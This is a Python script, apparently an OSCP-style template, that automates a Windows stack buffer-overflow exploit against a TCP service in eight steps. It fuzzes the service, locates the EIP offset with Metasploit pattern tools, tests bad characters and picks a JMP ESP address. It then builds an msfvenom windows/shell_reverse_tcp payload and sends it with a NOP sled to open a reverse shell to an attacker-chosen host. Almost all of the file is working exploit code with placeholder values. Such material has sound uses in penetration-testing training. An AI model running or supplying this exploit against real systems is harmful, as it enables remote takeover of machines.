#!/bin/python

import socket, time, sys, os, struct, ascii

# Eric's Copy-Paste Totally Not DRY OSCP Stack BOF Methodology
# ID: OS-80127
# I can't do something >3 times before needing to automate it. If this is not allowed, so be it.

##########################
step = 1  ## CHANGE THIS #
##########################

print("==== OVERFLOW SCRIPT ============================================================")

ip = "target"           ## CHANGE THIS
port = 1337             ## CHANGE THIS
timeout = 5             ## CHANGE THIS
lhost = "xxxxx"         ## CHANGE THIS 
lport = 1338            ## CHANGE THIS

print("Target:                         " + ip + ":" + str(port))

## Step 1 - Crash App
crash_len = 0
crash_A = "A" * crash_len

print("Buffer Overflows At:            " + str(crash_len) + " Bytes")

## Step 2 - Isolate EIP
if(step == 2):
    ### $ msf-pattern_create -l <crash_len+10%>                  * to isolate EIP
    ptrn_ofst = os.popen('msf-pattern_create -l ' + str(int(crash_len * 1.1))).read()

## Step 3 - Verify EIP is 42424242
if(step >= 3):

    tmp_eip = "" ## CHANGE THIS * Put the EIP from step 2 here (format: "35714234")
    
    ### $ msf-pattern_offset -l <crash_len+10%> -q <EIP_Value>  * to identify offset
    # print(int(crash_len * 1.1))
    
    eipoffset = int(os.popen('msf-pattern_offset -l ' + str(int(crash_len * 1.1)) + ' -q ' + str(tmp_eip) + ' | grep -Eo \'[0-9]{1,}\'').read())
    
    if(step == 3):
        print("EIP Offset is: \""+ str(eipoffset) + "\"")
    
    adjustment = 0 ## CHANGE THIS
    eipoffset += adjustment

## Step 4 - Get Idea of Surface Size
if(step >= 4):
    # * https://www.calculator.net/hex-calculator.html?number1= !end of CCCc addr! &c2op=-&number2= !start of CCCC addr! &calctype=op&x=48&y=22
    sta_AAAA = 0  ## CHANGE THIS (0xXXXXXXXX)
    BBBB =     0  ## CHANGE THIS
    end_CCCC = 0  ## CHANGE THIS
    
    if BBBB != 0:

        bar_len = 70
        bar_bef = int(bar_len * round( ( float(BBBB - sta_AAAA) / float(end_CCCC - sta_AAAA) ), 5 ))
        bar_aft = int(bar_len * round( ( float(end_CCCC - BBBB) /  float(end_CCCC - sta_AAAA) ), 5 ))
        
        print("==== OVERFLOW SUMMARY -----------------------------------------------------------")
        print("EIP Offset is:                  \""+ str(eipoffset) + "\" Bytes")
        print("Bytes Before EIP: AAA...        " + str(BBBB - sta_AAAA) + " Bytes")
        print("Bytes After EIP : ...CCC        " + str(end_CCCC - BBBB) + " Bytes")
        
        print("|A" + ("A" * bar_bef) + "A|BBBB|C" + ("C" * bar_aft)  + "C|")

## Step 5 - Determine Bad Characters
if(step >= 5):

    chars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    print(len(chars))
    
    bad_chars = "\x00"             # CHANGE THIS    "\x00"
    
    removed = [  ]  # CHANGE THIS (format "00", "4D",,,)
    
    for x in removed:
        if x.decode("hex") in chars:
            chars = chars.replace(x.decode("hex"), '')
    
    esc_bad_chars = "\\x00"     # CHANGE THIS    "\\x00"
    lst_bad_chars = [ ]

    print("Raw Bad Characters: " + bad_chars)
    print("Esc Bad Characters: " + esc_bad_chars)
    

## Step 6 - Find & Test An Available JMP ESP Instruction
if(step >= 6):
    # Results from: !mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"    (in log window)

    # * 625011af --> AF115062
    # * 625011bb --> BB115062
    #...
    
    # * 0x62501203 --> 03235062
    # * 0x62501205
    
    # 0x625011AF -->  62 50 11 AF --> AF 11 50 62 --> \xAF\x11\x50\x62

    # then in the top-left window do right click, goto, expression, 625011af, breakpoint, toggle

    jmp_esp = "" # CHANGE THIS (format: "\x03\x12\x50\x62")

## Step 7 - Generate Shellcode
if(step == 7):
    msf_payload = 'windows/shell_reverse_tcp'

    shell_gen = "msfvenom -p " + msf_payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f py -v shellcode EXITFUNC=thread" + " -b \"" + esc_bad_chars + "\""

    print("RUN THIS: ")
    print(shell_gen)


## Step 8 - EXPLOIT
if(step >= 8):

    print("fangers crossed")
    
    ### PASTE shellcode = b"" ... HERE!

    shellcode =  b""
    ## ...


    ##### END OF buf = area



def overflow():
    buffer = []
    counter = 100
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 100
    for string in buffer:
        print("Fuzzing with %s bytes" % len(string))
        send_payload(string, 1, " zzzzzzz")


def send_payload(payload, step, msg):

    print("==== STEP " + str(step) + " ====")
    print("** " + msg + " **")
    
# -- Paste the connection information from the POC here ---- V
# * hopefully it's that easy...

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("OVERFLOW4 " + payload + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))

        sys.exit(0)
        
## ^ ----------------------------------------------------- ^


if(step == 0):
   print("---debug---")
   
if(step == 1): # Payload #1  (fuzzer.py)
   overflow()
   
if(step == 2): # Payload #2  (offset.py)
   msg = "make sure you make note of the EIP register after this."
   send_payload(ptrn_ofst, step, msg)  # enough to get EIP
   
if(step == 3): # Payload #3  (crash.py)
   payload = str("A" * eipoffset) + "BBBB" + "CCCC" # double check (42424242)
   msg = "Make sure that the EIP is 42424242 == BBBB"
   print("Payload Length: " + str(len(payload)))
   send_payload(payload, step, msg)
   
if(step == 4): # Payload #4  (extend.py)
   payload = "A" * eipoffset + "BBBB" + str( "C" * ( crash_len * 3 ) )
   msg = "Time to make note of the start and end points of the address range!"
   print("Payload Length: " + str(len(payload)))
   send_payload(payload, step, msg)
   
if(step == 5): # Payload #5  (badchars.py)
   payload = "A" * eipoffset + "BBBBCCCC" + chars + str( "C" * ( (BBBB - sta_AAAA) - len(chars) ) )
   msg = "ur on ur own"
   print("Payload Length: " + str(len(payload)))
   send_payload(payload, step, msg)
   
if(step == 6):

   payload = "A" * eipoffset + jmp_esp + str( "C" * (BBBB - sta_AAAA) )

   msg = "breakpoint should be set, sending overflow with EIP Pointing to a JMP ESP instruction to confirm it works"
   
   print(payload)
   send_payload(payload, step, msg)

if(step == 7):
    payload = "" 
    msg = ""
    print("sending nothing")
    # send_payload(payload, step, msg)

if(step == 8):
    payload = "A" * eipoffset + jmp_esp + ( "\x90" * 16 ) + shellcode + str( "C" * ( ( (BBBB - sta_AAAA) - len(shellcode) ) - 16) )
    msg = "sending reverse shell"
    send_payload(payload, step, msg)










